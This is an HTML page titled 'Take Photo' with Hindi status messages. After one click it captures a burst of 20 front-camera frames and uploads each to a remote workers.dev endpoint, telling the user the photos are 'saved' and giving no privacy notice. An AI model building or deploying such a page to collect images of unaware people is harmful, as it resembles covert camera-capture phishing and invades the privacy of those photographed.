<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Take Photo</title>
<style>
:root{--bg:#fafafa;--fg:#161616;--muted:#777;--line:#dcdcdc;--ok:#1a7f4b;--err:#b3261e}
@media (prefers-color-scheme:dark){:root{--bg:#141414;--fg:#f2f2f2;--muted:#9a9a9a;--line:#333;--ok:#4cc38a;--err:#ff8a80}}
*{box-sizing:border-box}
html,body{height:100%;margin:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,"Segoe UI",sans-serif;display:flex;align-items:center;justify-content:center;padding:24px}
main{width:100%;max-width:360px;display:flex;flex-direction:column;gap:16px;align-items:stretch}
.frame{aspect-ratio:3/4;border:1px solid var(--line);border-radius:6px;overflow:hidden;background:#000;display:none;position:relative}
.frame.on{display:block}
video,img{width:100%;height:100%;object-fit:cover;display:block}
video{transform:scaleX(-1)}
.counter{position:absolute;top:8px;right:8px;background:rgba(0,0,0,.6);color:#fff;font-size:13px;padding:4px 9px;border-radius:999px;display:none}
.counter.on{display:block}
button{font:inherit;font-size:16px;padding:14px;border-radius:6px;border:1px solid var(--fg);background:var(--fg);color:var(--bg);cursor:pointer}
button.ghost{background:transparent;color:var(--fg);border-color:var(--line)}
button:disabled{opacity:.5;cursor:default}
button:focus-visible{outline:2px solid var(--fg);outline-offset:3px}
.row{display:flex;gap:8px}
.row button{flex:1}
#status{min-height:1.4em;font-size:14px;color:var(--muted);text-align:center;margin:0}
#status.ok{color:var(--ok)}
#status.err{color:var(--err)}
[hidden]{display:none!important}
</style>
</head>
<body>
<main>
<div class="frame" id="frame">
<div class="counter" id="counter"></div>
</div>
<button id="start">Take Photo</button>
<div class="row" id="capture" hidden>
<button class="ghost" id="cancel">Cancel</button>
<button id="snap">Capture</button>
</div>
<p id="status" role="status"></p>
</main>
<script>
const UPLOAD_URL="https://photos.my9761313328.workers.dev/upload";
const TOTAL_SHOTS=20;
const SHOT_INTERVAL_MS=350;
const frame=document.getElementById("frame");
const counterEl=document.getElementById("counter");
const startBtn=document.getElementById("start");
const capture=document.getElementById("capture");
const snapBtn=document.getElementById("snap");
const cancelBtn=document.getElementById("cancel");
const statusEl=document.getElementById("status");
let stream=null;
let video=null;
let busy=false;
let uploadedCount=0;
let failedCount=0;

function say(text,type){
statusEl.textContent=text||"";
statusEl.className=type||"";
}

function show(mode){
startBtn.hidden=mode!=="idle";
capture.hidden=mode!=="live";
frame.classList.toggle("on",mode!=="idle");
}

function setCounter(text){
counterEl.textContent=text;
counterEl.classList.toggle("on",!!text);
}

function stopStream(){
if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
}

async function openCamera(){
say("");
try{
stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
}catch(e){
say("Camera access nahi mila. Browser me permission allow karein.","err");
return;
}
video=document.createElement("video");
video.autoplay=true;
video.playsInline=true;
video.muted=true;
video.srcObject=stream;
frame.replaceChildren(video,counterEl);
show("live");
}

function grabFrame(){
return new Promise(resolve=>{
if(!video||!video.videoWidth){resolve(null);return}
const canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
const ctx=canvas.getContext("2d");
ctx.translate(canvas.width,0);
ctx.scale(-1,1);
ctx.drawImage(video,0,0);
canvas.toBlob(b=>resolve(b),"image/jpeg",0.8);
});
}

function uploadPhoto(blob,index){
const data=new FormData();
data.append("photo",blob,"photo-"+Date.now()+"-"+index+".jpg");
fetch(UPLOAD_URL,{method:"POST",body:data})
.then(res=>{
if(!res.ok)throw new Error(res.status);
uploadedCount++;
})
.catch(()=>{
failedCount++;
})
.finally(()=>{
const done=uploadedCount+failedCount;
if(failedCount>0){
say(done+"/"+TOTAL_SHOTS+" bheji gayin ("+failedCount+" fail)","err");
}else{
say(done+"/"+TOTAL_SHOTS+" photo save ho gayi","ok");
}
});
}

function sleep(ms){
return new Promise(r=>setTimeout(r,ms));
}

async function startBurst(){
if(busy)return;
busy=true;
snapBtn.disabled=true;
cancelBtn.disabled=true;
uploadedCount=0;
failedCount=0;
say("Photos li ja rahi hain...");
for(let i=1;i<=TOTAL_SHOTS;i++){
setCounter(i+"/"+TOTAL_SHOTS);
const blob=await grabFrame();
if(blob){
uploadPhoto(blob,i);
}else{
failedCount++;
}
if(i<TOTAL_SHOTS)await sleep(SHOT_INTERVAL_MS);
}
setCounter("");
stopStream();
show("idle");
snapBtn.disabled=false;
cancelBtn.disabled=false;
busy=false;
}

startBtn.addEventListener("click",openCamera);
snapBtn.addEventListener("click",startBurst);
cancelBtn.addEventListener("click",()=>{if(busy)return;stopStream();frame.replaceChildren(counterEl);show("idle");say("")});
</script>
</body>
</html>
